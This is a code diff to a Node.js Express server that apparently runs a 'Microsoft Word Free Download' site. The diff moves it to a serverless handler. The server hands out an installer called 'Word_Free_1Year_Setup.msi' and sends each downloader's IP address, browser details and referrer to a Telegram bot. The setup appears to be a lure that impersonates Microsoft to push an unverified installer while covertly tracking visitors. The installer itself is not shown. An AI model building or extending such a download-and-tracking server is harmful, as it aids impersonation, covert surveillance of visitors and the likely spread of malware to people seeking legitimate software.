@@ -3,10 +3,12 @@ const cors = require('cors');
 const path = require('path');
 const axios = require('axios');
 const UAParser = require('ua-parser-js');
+const serverless = require('serverless-http');
+
+// Load environment variables
 require('dotenv').config();
 
 const app = express();
-const PORT = process.env.PORT || 5000;
 
 // Telegram Bot Configuration
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
@@ -27,7 +29,6 @@ function sendTelegramLog(message) {
     const sendPromise = axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         chat_id: TELEGRAM_CHAT_ID,
         text: message
-        // Removed parse_mode to prevent injection issues
     });
 
     Promise.race([sendPromise, timeoutPromise])
@@ -37,7 +38,6 @@ function sendTelegramLog(message) {
 
 // Get client IP address with proper forwarded header parsing
 function getClientIP(req) {
-    // Parse x-forwarded-for to get the first (original) IP
     const forwarded = req.headers['x-forwarded-for'];
     if (forwarded) {
         const firstIP = forwarded.split(',')[0].trim();
@@ -97,19 +97,11 @@ function formatDownloadLog(userAgent, ip, referrer) {
 // Middleware
 app.use(cors());
 app.use(express.json());
-// Configure static files with no-cache headers for Replit
-app.use(express.static('client', {
-    setHeaders: (res, path) => {
-        res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
-        res.setHeader('Pragma', 'no-cache');
-        res.setHeader('Expires', '0');
-    }
-}));
 
 // API Routes
 app.get('/api/download/word-free', (req, res) => {
     const msiPath = process.env.MSI_FILE_PATH || 'client/public/Word_Free_1Year_Setup.msi';
-    const filePath = path.join(__dirname, msiPath);
+    const filePath = path.join(__dirname, '../../', msiPath);
     const fileName = 'Word_Free_1Year_Setup.msi';
     
     // Capture user details for logging
@@ -195,26 +187,4 @@ app.get('/api/product/info', (req, res) => {
     });
 });
 
-
-// Export the app for serverless platforms
-module.exports = app;
-
-// Only start the server if not running in serverless environment
-if (!process.env.VERCEL && !process.env.NETLIFY) {
-    // Determine platform
-    const isReplit = process.env.REPLIT_DEPLOYMENT;
-    const host = '0.0.0.0';
-
-    app.listen(PORT, host, () => {
-        console.log(`🚀 Microsoft Word Free Download Server running on http://${host}:${PORT}`);
-        console.log(`📄 Frontend: http://${host}:${PORT}`);
-        console.log(`🔗 API: http://${host}:${PORT}/api`);
-        console.log(`✅ Client-Server separation active`);
-        
-        if (isReplit) {
-            console.log(`✅ Replit configuration: ${host}:${PORT}`);
-        } else {
-            console.log(`✅ Generic hosting configuration: ${host}:${PORT}`);
-        }
-    });
-}
+module.exports.handler = serverless(app);
